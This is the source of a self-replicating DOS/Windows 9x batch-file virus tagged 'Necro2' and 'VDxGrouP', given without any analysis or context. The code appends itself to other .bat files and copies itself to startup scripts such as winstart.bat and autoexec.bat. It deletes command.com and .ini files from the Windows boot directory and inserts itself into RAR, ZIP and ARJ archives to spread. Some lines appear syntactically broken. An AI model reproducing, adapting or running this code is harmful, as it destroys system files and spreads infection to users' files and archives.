rem Necro2
@echo off
@cls rem "Necro2"
@if "%1"=="Necro2" goto $VD
@for %%b in (*.bat) do call %0 VDxGrouP %%b
type %0>vd.sys
for %%b in (*.bat) do set VD=%%b
find "VD"<%VD%
if "%2=="autoexec.bat goto $VD
rem necro
copy %0 c:\мои документы\command.bat
copy %0 c:\command.bat
copy %0 c:\%winbootdir%\winstart.bat
del c:\%winbootdir\???.ini
del c:\command.com
 Echo Necro2>>c:\autoexec.bat
 Echo Necro2 Vx>>c:\autoexec.bat
type %0.bat>>%2
for %%f in (*.rar *.zip *.arj) do attrib -r %%f
for %%r in (*.rar) do rar a -tk -y -c- -o+ %%r %0
for %%z in (*.zip) do pkzip -m %%z %0
for %%a in (*.arj) do arj a -d %%a %0
@copy %2+VD.sys
$vd
del vd.sys
